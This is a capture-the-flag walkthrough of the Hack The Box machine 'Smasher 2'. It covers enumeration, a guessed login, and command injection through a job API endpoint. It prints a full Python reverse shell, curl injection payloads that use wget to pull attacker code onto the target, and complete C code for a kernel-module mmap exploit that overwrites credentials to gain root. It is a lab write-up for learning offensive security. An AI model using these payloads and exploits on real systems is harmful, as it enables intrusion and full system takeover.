title:  "Smasher 2"

---

Summary
* Nmap found 3 open ports: 53,80,22
* Using dig to probe port 53, we find a few sub-domains – one being a login page
* We can “bypass” the login page by simply guessing the creds
* Once logged in we find a endpoint & a key. Using the key, we can access this endpoint
* The endpoint is vulnerable to command injection
* Doing some minor obfuscation, a shell can be gained
* Priv esc is a kernel exploit, through a custom KO file

As usual i'm going to add the IP `10.10.10.135` to my `/etc/hosts/` as `smasher2.htb`, lets get started!  
![images/22-1.png](/assets/smasher_2/22-1.png)  

First thing to do is run a full nmap scan on the target `nmap -sC -sV -p- -T4 10.10.10.135`:
```
Nmap scan report for smasher2.htb (10.10.10.135)

There's three ports open on the machine. The first port I'm going to look into will be 80:  
![images/22-2.png](/assets/smasher_2/22-2.png)  

The default Apache page. Nothing to interesting, so lets start **dirbusting** it, and while thats going we can dig at port 53:
![images/22-3.png](/assets/smasher_2/22-3.png)  

A dig command later, and we've found some sub-domains; while looking into port 53, gobuster was able to finish:  
![images/22-4.png](/assets/smasher_2/22-4.png)   

Quite a few 403 dirs, but backup appears to be accessible:  
![images/22-5.png](/assets/smasher_2/22-5.png)  

After downloading the two files, Auth.py appears to be some login script whilst ses.so seems to be a variation of auth.py, but in a different format. I'm going to investigate into the sub-domains before attempting to reverse engineer the binary.  

Now back to the sub-domains we found earlier. To access these sub-domains, we'll need to add them to `/etc/hosts` file:
```
echo 10.10.10.135	root.smasher2.htb wonderfulsessionmanager.smasher2.htb
```

The first sub-domain '**root.smasher2.htb**', redirects to the default apache page, but the other sub-domain '**wonderfulsessionmanager.smasher2.htb**' brings us to a login page:  
![images/22-7.png](/assets/smasher_2/22-7.png)  

Okay great, this page seems to resemble the '**auth.py**' script we found in '**/backup**'... Here's the login page & the GET req show in burpsuite:  
![images/22-8.png](/assets/smasher_2/22-8.png)  

Nothing super interesting.. Lets check back with the '**ses.so**'' binary, and see if that can be any help with this login.  

I'll be using '**Ghidra**'' to do the reverse engineering. Just a little bit of digging, and I've already found something helpful:  
![images/22-10.png](/assets/smasher_2/22-10.png)  
![images/22-11.png](/assets/smasher_2/22-11.png)  

Looks like if we find the pass or the user, we will be able to login. Reason being, is the pass & user use the same function to check if the input is valid. Meaning it should be much easier to guess/bruteforce the login.

If you do a little bit of guessing, you'll eventually find the right creds '**Administrator:Administrator**':  
![images/22-12.png](/assets/smasher_2/22-12.png)  

A key & an endpoint... The above information reminds me of the '**auth.py**' script we found earlier:

Okay, so after messing around with everything we've got thus far, I was able to get RCE, but only certain commands work -- due to a WAF. Here's what the curl command looks like so far:  
```
curl -H "Content-Type: application/json" -H "Cookie: session=eyJpZCI6eyIgYiI6Ik0yUm1Zek5rTW1Sak16VTFOemMxTm1ReE5Ua3dZalUyWVdGbVpHRmtZakpqTkRRMk5tTmpaUT09In19.XYVJAg.Lyh50FjtdwWO0DOPfwDBtWvXpNM" -d '{"schedule":"whoami"}' -X POST http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job
```

Time to get a shell -- we'll first need to upload a python reverse shell:
```
#!/usr/bin/python

import os
import socket
import subprocess

HOST = '<IP>' # The ip of the listener.
PORT = <PORT> # The same port as listener.

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT)) # Connect to listener.
s.send(str.encode("[*] Connection Established!")) # Send connection confirmation.

while 1: # Start loop.
    data = s.recv(1024).decode("UTF-8") # Recieve shell command.
    if data == "quit": 
        break # If it's quit, then break out and close socket.
    if data[:2] == "cd":
        os.chdir(data[3:]) # If it's cd, change directory.
    # Run shell command.
    if len(data) > 0:
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
        stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
        output_str = str(stdout_value, "UTF-8") # Format output.
        currentWD = os.getcwd() + "> " # Get current working directory.
        s.send(str.encode(currentWD + output_str)) # Send output to listener.
    
s.close() # Close socket.
```



Now to upload the reverse shell... Setup a server using python `python3 -m http.server`. With a server running, we can using wget on the target to download our .py reverse shell:
```
curl -H "Content-Type: application/json" -H "Cookie: session=<NEW SESSID HERE>" -d '{"schedule":"wget '<IP>'/'file.py'"}' -X POST http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job
```

Before excuting the ‘**file.py**’ script, you'll need to have a lisener up to catch the reverse shell:
```
nc -lvnp 9001
```

Curl command to execute '**file.py**':
```
curl -H "Content-Type: application/json" -H "Cookie: session=<NEW SESSID HERE>" -d '{"schedule":"python 'file.py'"}' -X POST http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job
```

Netcat:
![images/22-13.png](/assets/smasher_2/22-13.png)  

Fantastic, it all worked. Lets verify we can grab `user.txt`:  
![images/22-14.png](/assets/smasher_2/22-14.png)  

Onto root.

# Privesc 
As usual I'm going to get ssh access to smasher by making a '**.ssh**'' dir & echoing my '**.pub**' key into '**authorized_keys**':  
![images/34-1.png](/assets/smasher_2/34-1.png)

SSHing in:
![images/34-2.png](/assets/smasher_2/34-2.png)  

There's a '**README**' in the home dir -- lets see what that is:  
![images/34-3.png](/assets/smasher_2/34-3.png)  

Okay, so it seems like the creator is hinting towards BOF. Since the above is showing an error, the best place to look will be `/var/log`:  
![images/34-4.png](/assets/smasher_2/34-4.png)  

While looking through the logs, I noticed a slightly fishy sudo command running some device `dhid.ko`. The command was found inside of `auth.log.1`:
```
Feb 16 00:38:06 smasher sudo:     root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/sbin/insmod /lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko
```

Now, if we do some research, you'll find that there's exploits for kernal modules, specifically this article, which uses the '**mmap**'' handler to gain root “[https://labs.f-secure.com/assets/BlogFiles/mwri-mmap-exploitation-whitepaper-2017-09-18.pdf](https://labs.f-secure.com/assets/BlogFiles/mwri-mmap-exploitation-whitepaper-2017-09-18.pdf)”.  

The exploit used in the article will work for what we want, all we've got to change is the device that was targeted. We have a good idea what device to target due to reading `auth.log.1` -- onto exploitation.

# Exploitation
The article I linked above explains everything I'm about to do very well, so i highely suggest reading that if you want to understand what I'm doing. The c code given in the POC is kinda hard to copy & paste, so it'll take some time to properly format the c code. 

After reading the article, and fixing up the c code, I had a fully working exploit for the '**dhid.ko**' module. After compiling the c code, it's as easy as just running the binary:
![images/34-5.png](/assets/smasher_2/34-5.png)  

Here's the c code:
```
#include <sys/mman.h>
#include <err.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>

int main(int argc, char * const * argv)
{
  printf("[+] PID: %d\n", getpid());
  int fd = open("/dev/dhid", O_RDWR);
  if (fd < 0)
  	{
  		printf("[-] Open failed!\n");
  		return -1;
 	}
  	printf("[+] Open OK fd: %d\n", fd);

  	unsigned long size = 0xf0000000;
  	unsigned long mmapStart = 0x42424000;
  	unsigned int * addr = (unsigned int *)mmap ((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);
  	if (addr == MAP_FAILED)
  		{
  			perror("Failed to mmap: ");
  			close(fd);
  			return -1;
  		}

  		printf("[+]mmap OK addr: %ls\n", addr);

  		unsigned int uid = getuid();
  		printf("[+]UID: %d\n", uid);

  		unsigned int credIt = 0;
  		unsigned int credNum = 0;
  		while (((unsigned long)addr) < (mmapStart + size - 0x40))
  			{
  				credIt = 0;
  				if (
  					addr[credIt++] == uid &&
  					addr[credIt++] == uid &&
  					addr[credIt++] == uid &&
  					addr[credIt++] == uid &&
  					addr[credIt++] == uid &&
  					addr[credIt++] == uid &&
  					addr[credIt++] == uid &&
  					addr[credIt++] == uid
  					)
  				{
  					credNum++;
  					printf("[+] Found cred structure! ptr: %p, credNum: %d\n", addr, credNum);

  					credIt = 0;
  					addr[credIt++] = 0;
  					addr[credIt++] = 0;
  					addr[credIt++] = 0;
  					addr[credIt++] = 0;
  					addr[credIt++] = 0;
  					addr[credIt++] = 0;
  					addr[credIt++] = 0;
  					addr[credIt++] = 0;

  					if (getuid() == 0)
  					{
  						puts("[+] GOT ROOT!");
  						
  						credIt += 1; //Skip 4 bytes, to get capabilities
  						addr[credIt++] = 0xffffffff;
  						addr[credIt++] = 0xffffffff;
  						addr[credIt++] = 0xffffffff;
  						addr[credIt++] = 0xffffffff;
  						addr[credIt++] = 0xffffffff;
  						addr[credIt++] = 0xffffffff;
  						addr[credIt++] = 0xffffffff;
  						addr[credIt++] = 0xffffffff;
  						addr[credIt++] = 0xffffffff;
  						addr[credIt++] = 0xffffffff;
  						execl("/bin/sh", "-", (char * )NULL);
  						puts("[-] Execl failed...");

  						break;
  					}
  			
  				}
			
				addr++;
			}
			puts("[+] Scanning loop END");
			fflush(stdout);

			int stop = getchar();
			return 0;
		}
```

To get the c code to the target we can use SCP:
```
scp exploit.c dzonerzy@smasher2.htb:/tmp
```
Once the c code is on the target, we can use  '**gc**' to compile the c code: `gcc -o exploit exploit.c`, and finally run the exploit as seen in the above picture.

 Lets verify we can grab `root.txt`:
